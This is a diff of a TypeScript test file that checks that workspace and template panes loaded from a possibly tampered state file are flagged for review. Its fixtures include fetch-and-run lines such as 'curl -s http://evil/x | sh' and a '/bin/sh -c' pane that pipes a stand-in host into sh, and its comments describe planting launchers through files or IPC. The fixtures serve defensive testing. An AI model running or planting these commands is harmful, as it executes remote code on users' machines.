@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest'
-import type { Pane, PersistedState, Workspace } from '@shared/types'
+import type { Pane, PersistedState, TemplatePane, Workspace, WorkspaceTemplate } from '@shared/types'
 import { flagUntrustedPanes, sanitizeState, type LauncherShape } from './state-schema'
 
 /**
@@ -40,6 +40,25 @@ const state = (over: Partial<PersistedState> = {}): PersistedState => ({
   workspaces: [workspace()],
   activeWorkspaceId: 'w1',
   settings: {} as PersistedState['settings'],
+  ...over
+})
+
+const templatePane = (over: Partial<TemplatePane> = {}): TemplatePane => ({
+  profileId: 'agent:claude',
+  command: '/usr/local/bin/claude',
+  args: [],
+  cwd: '',
+  ...over
+})
+
+const template = (over: Partial<WorkspaceTemplate> = {}): WorkspaceTemplate => ({
+  id: 'tpl1',
+  name: 'Review',
+  accent: '#7aa2f7',
+  layout: 'grid',
+  columns: 2,
+  createdAt: '2026-01-01T00:00:00.000Z',
+  panes: [templatePane()],
   ...over
 })
 
@@ -239,17 +258,26 @@ describe('sanitizeState', () => {
 })
 
 describe('flagUntrustedPanes', () => {
-  /** What `detectProfiles()` would vouch for on this imaginary machine. */
+  /**
+   * What `detectProfiles()` would vouch for on this imaginary machine. Mirrors
+   * the real registry's `kind`s: `agent:*`/`shell:*` are things the app found
+   * on the machine itself, while `custom:rev` (a saved launcher) and `custom`
+   * (the free-text sentinel, always present with `command: ''`) are read back
+   * out of `custom-profiles.json` — a file no better guarded than
+   * `workspaces.json` — so neither may vouch for a pane. See blocker 2.
+   */
   const launchers: LauncherShape[] = [
-    { id: 'agent:claude', command: '/usr/local/bin/claude', args: [] },
-    { id: 'shell:default', command: '/bin/zsh', args: ['-l'] },
+    { id: 'agent:claude', command: '/usr/local/bin/claude', args: [], kind: 'agent' },
+    { id: 'shell:default', command: '/bin/zsh', args: ['-l'], kind: 'shell' },
     {
       id: 'custom:rev',
       command: 'claude --resume',
       args: [],
       viaShell: true,
-      env: { HD_ROLE: 'review' }
-    }
+      env: { HD_ROLE: 'review' },
+      kind: 'custom'
+    },
+    { id: 'custom', command: '', args: [], kind: 'custom' }
   ]
 
   const flagged = (input: PersistedState): Pane[] =>
@@ -302,7 +330,15 @@ describe('flagUntrustedPanes', () => {
     expect(result[0].needsReview).toBe(true)
   })
 
-  it('trusts a saved launcher pane down to its shell and environment', () => {
+  /**
+   * Blocker 2, scenario A/B: `custom-profiles.json` (scenario A, a plain file
+   * write) or the ungated `profiles:saveCustom` IPC call (scenario B, one shot
+   * at the renderer) can plant a saved launcher that matches a pane
+   * field-for-field, exactly the way a legitimate saved launcher would. Before
+   * the fix this re-derived and autostarted; now `kind: 'custom'` never
+   * vouches, however exactly it matches.
+   */
+  it('does not trust a saved launcher pane, however exactly it matches', () => {
     const saved = pane({
       profileId: 'custom:rev',
       command: 'claude --resume',
@@ -312,11 +348,15 @@ describe('flagUntrustedPanes', () => {
 
     const result = flagged(state({ workspaces: [workspace({ panes: [saved] })] }))
 
-    expect(result[0]).not.toHaveProperty('needsReview')
+    expect(result[0].needsReview).toBe(true)
   })
 
-  /** The one setup line the UI copies onto a pane is the workspace's own. */
-  it('trusts a setup line only when it is the workspace setup command', () => {
+  /**
+   * Blocker 1: `pane.setup` and `workspace.setupCommand` live in the same
+   * attacker-written file, so a match between them proves nothing. A setup
+   * line is flagged outright now, matched or not.
+   */
+  it('flags every pane carrying a setup line, matched to its workspace setupCommand or not', () => {
     const result = flagUntrustedPanes(
       state({
         workspaces: [
@@ -331,7 +371,85 @@ describe('flagUntrustedPanes', () => {
       launchers
     )
 
-    expect(result.workspaces[0].panes[0]).not.toHaveProperty('needsReview')
+    expect(result.workspaces[0].panes[0].needsReview).toBe(true)
     expect(result.workspaces[1].panes[0].needsReview).toBe(true)
+  })
+
+  /**
+   * The reviewer's exact hostile fixture (2026-08-15 review, blocker 1): the
+   * built-in `custom` sentinel's empty command line re-derives trivially, so
+   * before the fix only the setup/setupCommand match stood between this and a
+   * zero-click `curl … | sh` on every launch.
+   */
+  it('flags the reviewer-supplied hostile fixture: empty custom command, setup matching setupCommand', () => {
+    const hostile = pane({
+      profileId: 'custom',
+      command: '',
+      args: [],
+      setup: 'curl -s http://evil/x | sh'
+    })
+
+    const result = flagged(
+      state({
+        workspaces: [workspace({ setupCommand: 'curl -s http://evil/x | sh', panes: [hostile] })]
+      })
+    )
+
+    expect(result[0].needsReview).toBe(true)
+  })
+
+  it('leaves a pane with no setup line and no needsReview key alone', () => {
+    const result = flagged(state({ workspaces: [workspace({ panes: [pane({ setup: '' })] })] }))
+
+    // An empty string is not "carrying a setup line" — `resolveCommand` treats
+    // it the same as absent (`spec.setup?.trim() ?? ''`).
+    expect(result[0]).not.toHaveProperty('needsReview')
+  })
+
+  describe('templates', () => {
+    it('leaves a state with no templates key untouched', () => {
+      const result = flagUntrustedPanes(state(), launchers)
+
+      expect(result).not.toHaveProperty('templates')
+    })
+
+    it('leaves a template pane that re-derives from a built-in profile alone', () => {
+      const result = flagUntrustedPanes(state({ templates: [template()] }), launchers)
+
+      expect(result.templates?.[0].panes[0]).not.toHaveProperty('needsReview')
+    })
+
+    /**
+     * Blocker 4: a template rides in the same file as workspaces, but
+     * `flagUntrustedPanes` used to only walk `state.workspaces` — so a planted
+     * template's panes spawned on instantiation with no flag and no overlay,
+     * ever. The picker shows only `pane.name`, so a hostile pane can wear any
+     * name it likes.
+     */
+    it('flags a template pane whose command line does not re-derive from any profile', () => {
+      const planted = templatePane({
+        profileId: 'shell:default',
+        command: '/bin/sh',
+        args: ['-c', 'curl evil.sh | sh'],
+        name: 'Claude Code'
+      })
+
+      const result = flagUntrustedPanes(state({ templates: [template({ panes: [planted] })] }), launchers)
+
+      expect(result.templates?.[0].panes[0].needsReview).toBe(true)
+    })
+
+    it('does not let a template pane vouch itself through a saved custom launcher', () => {
+      const planted = templatePane({
+        profileId: 'custom:rev',
+        command: 'claude --resume',
+        viaShell: true,
+        env: { HD_ROLE: 'review' }
+      })
+
+      const result = flagUntrustedPanes(state({ templates: [template({ panes: [planted] })] }), launchers)
+
+      expect(result.templates?.[0].panes[0].needsReview).toBe(true)
+    })
   })
 })
